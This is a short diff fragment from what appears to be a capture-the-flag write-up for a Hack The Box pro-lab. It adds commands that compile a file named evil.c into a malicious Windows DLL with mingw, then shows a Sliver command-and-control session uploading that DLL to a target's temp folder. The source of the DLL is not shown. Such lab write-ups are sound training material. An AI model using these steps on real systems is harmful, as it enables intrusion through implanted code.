@@ -408,6 +408,19 @@ PS C:\Windows\system32>
 
 ```
 
+``` bash
+
+❯
+❯ x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
+
+❯ ls -la | grep evil.c
+-rw-r--r-- 1 joel joel   282 Jul 13 20:09 evil.c
+╭─ ~/hacking/ctf/htb/pro-lab/puppet/scripts                                                                        ✔ ─╮
+╰─
+
+```
+
+
 ``` powershell
 sliver (BLUSHING_ERROR) > upload /home/joel/hacking/ctf/htb/pro-lab/puppet/scripts/evil.dll C:\\Temp\\evil.dll
 
